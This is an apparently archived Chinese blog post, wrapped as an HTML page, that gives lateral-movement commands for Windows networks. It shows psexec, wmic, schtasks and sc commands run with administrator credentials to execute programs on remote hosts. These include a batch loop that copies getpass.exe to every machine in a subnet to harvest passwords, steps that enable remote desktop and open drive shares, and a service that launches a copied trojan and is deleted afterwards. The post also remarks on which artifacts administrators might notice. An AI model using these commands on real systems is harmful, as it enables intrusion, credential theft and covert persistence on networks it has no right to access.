@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <meta name="description" content="查看远程计算机共享内容1net view \\192.168.1.100
+psexec:远程执行工具
+环境: 需要开启admin$445端口
+注意:psExec建立连接后会在对方机器安装一个服务(PSEXESVC),exit退出后会清除,但是会出现概率不能删除,易于管理员发现(本地测试过几次,只有一次安装了服务)12psexec \\192.168.1.100 /accepteula -u administrator -p 123456 ipconfig  #远程执行cmd命令并返回结果psexec \\192.168.1.100 /accepteula -u administrator -p 123456 -c getpass.exe
+-c &amp;lt;[路径]文件名&amp;gt;:拷贝文件到远程机器并运行(注意:运行结束后文件会自动删除)
+getpass.exe为本机psexec.exe所在目录下,也可以直接执行其他目录的路径,例如c:\getpass.exe
+批量抓同网段密码1for /L %%G in (128 1 128) do  psexec \\172.16.44.%%G  /accepteula -u administrator -p 123456 -c c:\getpass.exe &amp;gt;172.16.44.%%G_pass.txt" />
+  
+
+  
+  
+  
+  
+  
+  
+  <title>远程执行命令的几种方法 | lhcoro&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="查看远程计算机共享内容1net view \\192.168.1.100 psexec:远程执行工具 环境: 需要开启admin$445端口 注意:psExec建立连接后会在对方机器安装一个服务(PSEXESVC),exit退出后会清除,但是会出现概率不能删除,易于管理员发现(本地测试过几次,只有一次安装了服务)12psexec \\192.168.1.100 /accepteula -u adm">
+<meta name="keywords" content="schtasks,wmic,psexec,sc,ipc">
+<meta property="og:type" content="article">
+<meta property="og:title" content="远程执行命令的几种方法">
+<meta property="og:url" content="http://3389.in/2017/02/13/remotely-execute-commands/index.html">
+<meta property="og:site_name" content="lhcoro&#39;s blog">
+<meta property="og:description" content="查看远程计算机共享内容1net view \\192.168.1.100 psexec:远程执行工具 环境: 需要开启admin$445端口 注意:psExec建立连接后会在对方机器安装一个服务(PSEXESVC),exit退出后会清除,但是会出现概率不能删除,易于管理员发现(本地测试过几次,只有一次安装了服务)12psexec \\192.168.1.100 /accepteula -u adm">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-04-19T07:32:40.746Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="远程执行命令的几种方法">
+<meta name="twitter:description" content="查看远程计算机共享内容1net view \\192.168.1.100 psexec:远程执行工具 环境: 需要开启admin$445端口 注意:psExec建立连接后会在对方机器安装一个服务(PSEXESVC),exit退出后会清除,但是会出现概率不能删除,易于管理员发现(本地测试过几次,只有一次安装了服务)12psexec \\192.168.1.100 /accepteula -u adm">
+  
+  
+    <link rel="icon" href="/css/images/favicon.ico">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+  
+  <!-- baidu webmaster push -->
+  <!--<script src='//push.zhanzhang.baidu.com/push.js'></script>-->
+</head>
+
+<body class="home blog custom-background custom-font-enabled single-author">
+  <div id="page" class="hfeed site">
+      <header id="masthead" class="site-header" role="banner">
+    <hgroup>
+      <h1 class="site-title">
+        <a href="/" title="lhcoro&#39;s blog" rel="home">lhcoro&#39;s blog</a>
+      </h1>
+      
+        <script type="text/javascript" src="http://api.hitokoto.us/rand?encode=js&charset=utf-8"></script>
+        <h2 class="site-description"><script>hitokoto();</script></h2>
+      
+    </hgroup>
+
+    <nav id="site-navigation" class="main-navigation" role="navigation">
+            <button class="menu-toggle">菜单</button>
+            <a class="assistive-text" href="/#content" title="跳至内容">跳至内容</a><!--TODO-->
+            <div class="menu-main-container">
+                <ul id="menu-main" class="nav-menu">
+                
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/">Home</a></li>
+                
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/archives">Archives</a></li>
+                
+                </ul>
+            </div>
+    </nav>
+</header>
+      <div id="main" class="wrapper">
+        <div id="primary" class="site-content"><div id="content" role="main"><article id="post-remotely-execute-commands" class="post-remotely-execute-commands post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        
+  
+    <h1 class="entry-title article-title">
+      远程执行命令的几种方法
+    </h1>
+  
+
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="http://3389.in/2017/02/13/remotely-execute-commands/" data-id="cjg6al6kf000a34ok0ucrtw99" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <p><strong>查看远程计算机共享内容</strong><br><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> view \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">100</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>psexec:<br>远程执行工具</strong></p>
+<p>环境: 需要开启admin$<br>445端口</p>
+<p>注意:psExec建立连接后会在对方机器安装一个服务(PSEXESVC),exit退出后会清除,但是会出现概率不能删除,易于管理员发现(本地测试过几次,只有一次安装了服务)<br><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">psexec \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">100</span> /accepteula -u administrator -p <span class="number">123456</span> <span class="built_in">ipconfig</span>  #远程执行<span class="built_in">cmd</span>命令并返回结果</span><br><span class="line">psexec \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">100</span> /accepteula -u administrator -p <span class="number">123456</span> -c getpass.exe</span><br></pre></td></tr></table></figure></p>
+<p>-c &lt;[路径]文件名&gt;:拷贝文件到远程机器并运行(注意:运行结束后文件会自动删除)</p>
+<p>getpass.exe为本机psexec.exe所在目录下,也可以直接执行其他目录的路径,例如c:\getpass.exe</p>
+<p><strong>批量抓同网段密码</strong><br><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /L <span class="variable">%%G</span> <span class="keyword">in</span> (<span class="number">128</span> <span class="number">1</span> <span class="number">128</span>) <span class="keyword">do</span>  psexec \\<span class="number">172</span>.<span class="number">16</span>.<span class="number">44</span>.<span class="variable">%%G</span>  /accepteula -u administrator -p <span class="number">123456</span> -c c:\getpass.exe &gt;<span class="number">172</span>.<span class="number">16</span>.<span class="number">44</span>.<span class="variable">%%G</span>_pass.txt</span><br></pre></td></tr></table></figure></p>
+<a id="more"></a>
+<p>拷贝本地psexec.exe文件所在目录的getpass.exe到远程计算机. 执行并返回结果 ,并删除远程计算机的getpass.exe(批量抓全部机器密码)</p>
+<p><strong>wmic:<br>从命令行接口和批命令脚本执行系统管理的支持</strong></p>
+<p>环境:WMIC服务启动(Windows Management Instrumentation),禁用情况下会提示Description = 无法启动服务<br>135端口</p>
+<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">100</span> /user:administrator /password:<span class="number">123456</span> process <span class="keyword">call</span>  create c:\<span class="number">1</span>.exe      ##创建进程,可以直接运行exe程序或者执行系统命令,例如添加用户,不过没有命令返回的结果  </span><br><span class="line">wmic /node:<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">100</span> /user:administrator /password:<span class="number">123456</span> process  ##查看远程计算机进程   </span><br><span class="line">wmic /node:<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">100</span> /user:administrator /password:<span class="number">123456</span> process where name="calc.exe" <span class="keyword">call</span> terminate  ##关闭远程计算机进程   </span><br><span class="line">wmic /output:"<span class="variable">%userprofile%</span>\Desktop\temp.html" /node:<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">100</span> /user:administrator /password:<span class="number">123456</span>  process list full /<span class="built_in">format</span>:htable ##读取进程并以html格式化输出到本地桌面   </span><br><span class="line">wmic /node:<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">100</span> /user:administrator /password:<span class="number">123456</span> useraccount ##查看远程计算机用户    </span><br><span class="line">wmic /node:<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">100</span> /user:administrator /password:<span class="number">123456</span> computersystem get domain  ##读取远程计算机域/工作组    </span><br><span class="line">wmic /node:<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">100</span> /user:administrator /password:<span class="number">123456</span> SHARE <span class="keyword">CALL</span> Create "","test","<span class="number">3</span>","c_share","","c:\",<span class="number">0</span>  ##开启远程计算机共享 c_share为共享名字,c:\为共享路径  </span><br><span class="line">wmic /node:<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">100</span> /user:administrator /password:<span class="number">123456</span> SHARE where name="c_share" <span class="keyword">call</span> delete  ##删除远程计算机共享,可以直接运行SHARE  查看全部共享 </span><br><span class="line">wmic /node:<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">100</span> /user:administrator /password:<span class="number">123456</span>  <span class="built_in">PATH</span> win32_terminalservicesetting WHERE (__Class!="") <span class="keyword">CALL</span> SetAllowTSConnections <span class="number">1</span>         ##开启远程计算机的远程桌面 </span><br><span class="line">wmic /output:"<span class="variable">%userprofile%</span>\Desktop\temp.html" /node:<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">100</span> /user:administrator /password:<span class="number">123456</span> FSDIR where "drive='c:'" list  /<span class="built_in">format</span>:htable    ##读取远程计算机C盘的全部目录并输出到桌面</span><br></pre></td></tr></table></figure>
+<p><strong>schtasks:<br>本地或远程系统上的计划系统。替代 at</strong></p>
+<p>条件:启动Task Scheduler服务<br><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">100</span>\ipc$ <span class="number">123456</span> /user:administrator </span><br><span class="line">schtasks /create /tn foobar /tr c:\windows\temp\foobar.exe /s \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">100</span> /ru system  /sc once /st <span class="number">05</span>:<span class="number">00</span> </span><br><span class="line">schtasks /run /tn foobar /s  <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">100</span>              ##远程计算机启动任务 </span><br><span class="line">schtasks /F /delete /tn foobar /s <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">100</span>          ##清除schtasks</span><br></pre></td></tr></table></figure></p>
+<p><strong>sc:<br>远程创建服务管理程序</strong></p>
+<p>sc命令各个参数的等号后面都要有一个空格,否则报语法错误<br><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sc \\host create foobar binpath=“c:\windows\temp\foobar.exe”    ##新建服务,指向拷贝的木马路径 </span><br><span class="line">sc \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">100</span> create foobar binpath= c:\udp.exe obj= administrator password= "<span class="number">123456</span>" </span><br><span class="line">sc \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">100</span> <span class="built_in">start</span> foobar        ##启动建立的服务 </span><br><span class="line">sc \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">100</span> delete foobar    ##完事后删除服务</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2017/02/13/remotely-execute-commands/">
+    <time datetime="2017-02-13T14:31:06.000Z" class="entry-date">
+        2017-02-13
+    </time>
+</a>
+    
+  <span class="article-delim">&#8226;</span>
+  <div class="article-category">
+  <a class="article-category-link" href="/categories/内网安全/">内网安全</a>
+  </div>
+
+    
+  <span class="article-delim">&#8226;</span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ipc/">ipc</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/psexec/">psexec</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sc/">sc</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/schtasks/">schtasks</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wmic/">wmic</a></li></ul>
+
+    </footer>
+</article>
+
+
+    
+<nav class="nav-single">
+    <h3 class="assistive-text">文章导航</h3>
+    
+        <span class="nav-previous"><a href="/2017/03/30/iis-6-0-remote-execute/" rel="prev"><span class="meta-nav">←</span> IIS6.0远程命令执行漏洞(CVE-2017-7269)</a></span>
+    
+    
+        <span class="nav-next"><a href="/2017/01/13/vpn-auto/" rel="next">VPN断线后自动断网脚本 <span class="meta-nav">→</span></a></span>
+    
+</nav><!-- .nav-single -->
+
+
+
+
+
+
+
+</div></div>
+        <div id="secondary" class="widget-area" role="complementary">
+  
+    <aside id="search" class="widget widget_search"><form role="search" method="get" accept-charset="utf-8" id="searchform" class="searchform" action="//google.com/search">
+    <div>
+        <input type="text" value="" name="s" id="s" />
+        <input type="submit" id="searchsubmit" value="搜索" />
+    </div>
+</form></aside>
+  
+    
+  
+    
+  <aside class="widget">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget-content">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Share/">Share</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Tools/">Tools</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web安全/">Web安全</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/内网安全/">内网安全</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/社会工程/">社会工程</a><span class="category-list-count">1</span></li></ul>
+    </div>
+  </aside>
+
+  
+    
+  <aside class="widget">
+    <h3 class="widget-title">Recents</h3>
+    <div class="widget-content">
+      <ul>
+        
+          <li>
+            <a href="/2018/04/19/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2017/09/03/pycharm-license/">pycharm激活(JetBrains IDEA 系列产品通用xx方法(license server))</a>
+          </li>
+        
+          <li>
+            <a href="/2017/03/30/iis-6-0-remote-execute/">IIS6.0远程命令执行漏洞(CVE-2017-7269)</a>
+          </li>
+        
+          <li>
+            <a href="/2017/02/13/remotely-execute-commands/">远程执行命令的几种方法</a>
+          </li>
+        
+          <li>
+            <a href="/2017/01/13/vpn-auto/">VPN断线后自动断网脚本</a>
+          </li>
+        
+      </ul>
+    </div>
+  </aside>
+
+  
+    
+  <aside class="widget">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget-content">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/10086/">10086</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Oracle/">Oracle</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pycharm/">Pycharm</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RLO/">RLO</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RTLO/">RTLO</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/VPN/">VPN</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WinRaR/">WinRaR</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Windows/">Windows</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bash/">bash</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve-2017-7269/">cve-2017-7269</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fwtmp/">fwtmp</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/iis6-0/">iis6.0</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ipc/">ipc</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/last/">last</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/license/">license</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/psexec/">psexec</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sc/">sc</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/schtasks/">schtasks</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shred/">shred</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql注入/">sql注入</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/utmpdump/">utmpdump</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wmic/">wmic</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/匿名/">匿名</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/命令执行/">命令执行</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/社会工程学/">社会工程学</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/钓鱼/">钓鱼</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/黑色产业/">黑色产业</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </aside>
+
+  
+    
+  <aside class="widget">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget-content tagcloud">
+      <a href="/tags/10086/" style="font-size: 10px;">10086</a> <a href="/tags/Oracle/" style="font-size: 10px;">Oracle</a> <a href="/tags/Pycharm/" style="font-size: 10px;">Pycharm</a> <a href="/tags/RLO/" style="font-size: 10px;">RLO</a> <a href="/tags/RTLO/" style="font-size: 10px;">RTLO</a> <a href="/tags/VPN/" style="font-size: 10px;">VPN</a> <a href="/tags/WinRaR/" style="font-size: 10px;">WinRaR</a> <a href="/tags/Windows/" style="font-size: 10px;">Windows</a> <a href="/tags/bash/" style="font-size: 10px;">bash</a> <a href="/tags/cve-2017-7269/" style="font-size: 10px;">cve-2017-7269</a> <a href="/tags/fwtmp/" style="font-size: 10px;">fwtmp</a> <a href="/tags/iis6-0/" style="font-size: 10px;">iis6.0</a> <a href="/tags/ipc/" style="font-size: 10px;">ipc</a> <a href="/tags/last/" style="font-size: 10px;">last</a> <a href="/tags/license/" style="font-size: 10px;">license</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/psexec/" style="font-size: 10px;">psexec</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/sc/" style="font-size: 10px;">sc</a> <a href="/tags/schtasks/" style="font-size: 10px;">schtasks</a> <a href="/tags/shred/" style="font-size: 10px;">shred</a> <a href="/tags/sql注入/" style="font-size: 10px;">sql注入</a> <a href="/tags/utmpdump/" style="font-size: 10px;">utmpdump</a> <a href="/tags/wmic/" style="font-size: 10px;">wmic</a> <a href="/tags/匿名/" style="font-size: 20px;">匿名</a> <a href="/tags/命令执行/" style="font-size: 10px;">命令执行</a> <a href="/tags/社会工程学/" style="font-size: 10px;">社会工程学</a> <a href="/tags/钓鱼/" style="font-size: 10px;">钓鱼</a> <a href="/tags/黑色产业/" style="font-size: 10px;">黑色产业</a>
+    </div>
+  </aside>
+
+  
+</div>
+      </div>
+      <footer id="colophon" role="contentinfo">
+    <p>&copy; 2018 lhcoro
+    All rights reserved.</p>
+    <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
+</footer>
+    <script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+<script src="/js/navigation.js"></script>
+
+<div id="bg"></div>
+
+  </div>
+</body>
+</html>
